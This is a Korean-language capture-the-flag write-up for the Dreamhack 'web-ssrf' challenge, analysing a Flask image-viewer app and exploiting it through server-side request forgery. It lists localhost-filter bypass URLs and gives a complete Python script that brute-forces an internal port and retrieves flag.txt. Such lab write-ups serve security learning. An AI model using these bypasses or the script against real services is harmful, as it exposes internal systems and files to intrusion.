# web-ssrf

### Overview

[Link (web-ssrf)](https://dreamhack.io/wargame/challenges/75)

**Environment**
```
Language: Python
Framework: Flask
```


1. Code Analysis<a href="#1-code-analysis"><sup>[1]</sup></a>
    - app.py
        - Hint
        - `/`
        - `/img_viewer`
        - `local_server(local_host + local_port)`
        - `run_local_server`

2. Vulnerability<a href="#2-vunerability"><sup>[2]</sup></a>

    - SSRF(Server Side Request Forgery)

3. Scenario<a href="#3-scenario"><sup>[3]</sup></a>

4. Payload<a href="#4-payload"><sup>[4]</sup></a>

5. Exploit<a href="#5-exploit"><sup>[5]</sup></a>

6. Conclusion<a href="#5-conclusion"><sup>[6]</sup></a>

---

### 1. Code Analysis

- main.js

    - Hint
    ```python
    try:
        FLAG = open("./flag.txt", "r").read()  # Flag is here!!
    except:
        FLAG = "[**FLAG**]"
    ```
    이후 서버 생성 시 요청되는 위치에 사용된다.  
    현재 디렉토리의 `flag.txt`를 읽고 있으므로 `app.py`가 같은 디렉토리임을 기억하자.

    <br/>

    - `/`
    ```python
    app.route("/")
    def index():
        return render_template("index.html")
    ```
    `index.html`을 표시해준다.

    </br>
    
    - `/img_viewer`
    ```python
    @app.route("/img_viewer", methods=["GET", "POST"])
    def img_viewer():
        if request.method == "GET":
            return render_template("img_viewer.html")
        elif request.method == "POST":
            url = request.form.get("url", "")
            urlp = urlparse(url)
            if url[0] == "/":
                url = "http://localhost:8000" + url
            elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
                data = open("error.png", "rb").read()
                img = base64.b64encode(data).decode("utf8")
                return render_template("img_viewer.html", img=img)
            try:
                data = requests.get(url, timeout=3).content
                img = base64.b64encode(data).decode("utf8")
            except:
                data = open("error.png", "rb").read()
                img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
    ```
    `GET`, `POST` 메서드 요청을 받는다.  
    `GET` 요청 시 `img_viewer.html` 페이지를 표시해준다.  
    `POST` 요청 시
    - 파라미터로 들어온 `url`을 변수 `url`에 저장한 후, 변수 `urlp`에 파싱하여 저장한다.
    - 변수 `url`의 첫 char가 `"/"`라면 `http://localhost:8000`의 뒤에 붙여 변수 `url`에 저장한다.
    - `urlp.netloc`(host + port 형태)내에 `"localhost"` 혹은 `"127.0.0.1"` 가 존재한다면 아래와 같은 필터링을 수행한다.  
    *`error.png`를 data에 저장한 후, `base64`로 인코딩, `utf8`로 디코딩 하여 `img` 변수에 저장하여 `/img_viewer`에 파라미터로 전달하여 리턴한다.
    - 상단의 `elif` 구문에 들어가지 않았다면 `url`의 `content`를 `GET` 메서드로 요청하여, 상단의 별표(*)의 인코딩, 디코딩 부분의 작업을 진행한다.  
    (여기서 데이터는 `error.png`가 아니다.)
    - `timeout`을 포함한 `exception` 발생 시 상단의 별표(*)의 과정을 똑같이 수행한다.  
    (여기서 데이터는 `error.png`이다.)

    <br/>

    - `local_server(local_host + local_port)`
    ```python
    local_host = "127.0.0.1"
    local_port = random.randint(1500, 1800)
    local_server = http.server.HTTPServer(
        (local_host, local_port), http.server.SimpleHTTPRequestHandler
    )
    print(local_port)
    ```
    SSRF(Server Side Request Forgery) 취약점이 드러나는 부분이다.  
    오픈된 포트가 존재하고, `localhost` 혹은 `loopback` 주소가 목적지이기에 외부에서 접근할 수 없다.  
    `local_server`의 주소는 `"127.0.0.1:(1500 ~ 1800)"`이다.  
    `http.server.HTTPServer`의 두 번째 인자로 http.server.SimpleHttpRequestHandler를 전달하면,  
    현재 디렉터리를 기준으로 URL이 가리키는 리소스를 반환하는 웹 서버가 생성된다.  
    (Hint의 `flag.txt`의 위치를 기억하자.)
    
    </br>
    
    - `run_local_server`
    ```python
    def run_local_server():
        local_server.serve_forever()
    ```
    `local_server`에서 `shutdown` 명령이 있기 전까지 명령을 처리한다.

---

### 2. Vunerability
- SSRF(Server Side Request Forgery):  
    서버 리소스에 접근 가능한 주소가 특정 포트에 의해 열려있다. 단, 여기서 주소는 `localhost`를 지정하였기에 외부에서 접근이 불가능하다.  
    서버 측에 이용자의 데이터를 받아 요청을 전송하는 기능이 구현되어 있으므로, 이를 이용하여 SSRF를 수행한다.

---

### 3. Scenario

1. 가용한 정보는 `flag`의 위치, 서버에 요청을 보낼 수 있는 페이지(`/img_viewer`), 서버의 리소스를 반환해주는 서버의 호스트 주소와 포트 번호 범위이다.

2. 확인된 취약점은 `SSRF(Server Side Request Forgery)`이다.

3. 스크립트를 통해 `/img_viewer`의 요청 부분에 `Brute Force`를 수행하여 서버 리소스에 접근 가능한 포트 번호를 찾는다.(필터링에 유의하자.)

![Filter Bypass](/Wargame/web-ssrf/img/Filter%20Bypass.png)

```
http://vcap.me:8000/
http://0x7f.0x00.0x00.0x01:8000/
http://0x7f000001:8000/
http://2130706433:8000/
http://Localhost:8000/
http://127.0.0.255:8000/
```

4. `/img_viewer`에 찾아낸 주소의 `flag.txt`를 요청한다.

5. 반환된 값은 `base64`로 인코딩, `utf8`로 디코딩 된 값임을 유의하여 역순으로 `flag.txt`의 평문을 찾아낸다.

---

### 4. Payload

```python
f"http://Localhost:{port}"
```
위 코드를 1500번부터 1800번까지 `Brute Force` 공격으로 접근 가능한 주소를 찾는다.
```python
f"http://Localhost:{internal_port}/flag.txt"
```
찾아낸 포트 번호로 위의 요청을 `img_viewer`에 요청한다.

---

### 5. Exploit

1. exploit.py
```python
#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import base64
import sys
from tqdm import tqdm

# `src` value of "NOT FOUND X"
NOTFOUND_IMG = "iVBORw0KG"

def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text
    
    
def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port
    
    
if __name__ == "__main__":
    chall_url = f"{sys.argv[1]}/img_viewer"
    internal_port = find_port()
    res = BeautifulSoup(send_img(f"http://Localhost:{internal_port}/flag.txt"), 'html.parser')
    print(base64.b64decode(res.find("img")["src"].split()[1]))
```
실행 파일의 파라미터로 받은 URL에 `/img_viewer`를 붙인 값을 `chall_url`에 저장한다.  
이후 열린 포트 번호를 찾기 위해 `find_port()`를 수행하여 `Brute Force` 공격을 수행한다.  
찾은 포트로 `flag.txt`를 반환하는 요청을 수행한다.  
`base64`의 `b64decode`의 리턴값은 `b'{value}'`의 형식을 취한다는 점에 유의하자.
(`NOTFOUND_IMG = "iVBORw0KG"`의 대입값은 `base64`로 인코딩 된 값으로 `PNG`를 나타낸다.  
즉, 요청한 값은 `flask` 이외의 서비스 포트 서버임으로 `PNG`가 출력되면 안된다. `PNG`가 출력되었다는 것은 `exceoption`이 발생하여 웹 서비스의 `error.png`가 출력되었음을 의미한다.)

2. index
![index](/Wargame/web-ssrf/img/index.png)

3. img_viewer
![img_viewer](/Wargame/web-ssrf/img/img_viewer.png)

4. img_viewer - Normal
![img_viewer - Normal](/Wargame/web-ssrf/img/img_viewer%20-%20Normal.png)

5. img_viewer - Not Found
![img_viewer - Not Found](/Wargame/web-ssrf/img/img_viewer%20-%20Not%20Found.png)

6. Execute exploit.py
![exploit_adv](/Wargame/web-ssrf/img/exploit_adv.png)

---

### 6. Conclusion


---

[_Go to top_ ↑](#mango)